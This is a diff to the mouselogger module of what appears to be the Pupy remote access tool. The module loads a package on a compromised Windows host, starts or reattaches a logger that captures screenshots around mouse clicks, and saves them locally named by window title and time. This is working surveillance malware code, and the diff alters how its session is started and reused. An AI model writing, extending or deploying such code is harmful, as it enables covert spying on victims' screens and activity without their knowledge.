@@ -8,7 +8,7 @@ import traceback
 import time
 import os
 import os.path
-from pupylib.utils.rpyc_utils import obtain
+from pupylib.utils.rpyc_utils import obtain, redirected_stdo
 
 def pil_save(filename, pixels, width, height):
 	from PIL import Image, ImageFile
@@ -45,12 +45,17 @@ class MouseLoggerModule(PupyModule):
 		except Exception:
 			pass
 		if args.action=="start":
+			self.client.load_package("pupwinutils.mouselogger")
 			if self.mouselogger:
 				self.error("the mouselogger is already started")
 			else:
-				self.client.load_package("pupwinutils.mouselogger")
-				self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].MouseLogger()
-				self.mouselogger.start()
+				self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].get_mouselogger()
+				if not self.mouselogger.is_alive():
+					with redirected_stdo(self.client.conn):
+						self.mouselogger.start()
+					self.success("mouselogger started")
+				else:
+					self.success("previously started mouselogger session retrieved")
 		else:
 			if not self.mouselogger:
 				self.error("the mouselogger is not running")
@@ -60,7 +65,6 @@ class MouseLoggerModule(PupyModule):
 				screenshots_list=obtain(self.mouselogger.retrieve_screenshots())
 
 				self.success("%s screenshots taken"%len(screenshots_list))
-				print str(screenshots_list)[0:50]
 				for d, height, width, exe, win_title, buf in screenshots_list:
 					try:
 						filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+str(unicode(win_title, errors="ignore")).replace(" ","_").replace("\\","").replace("/","")+"_"+str(d).replace(" ","_").replace(":","-")+".jpg")
